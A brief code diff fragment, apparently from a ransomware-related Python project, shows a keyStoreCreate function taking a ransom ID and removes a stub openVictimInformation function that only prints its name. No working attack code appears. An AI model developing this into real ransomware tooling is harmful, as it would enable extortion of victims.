@@ -103,7 +103,3 @@ def keyStoreCreate(version,ransomid):
         # and so on
     print("STORE FILE CREATED")
 
-def openVictimInformation():
-    print("openVictimInformation")
-
-
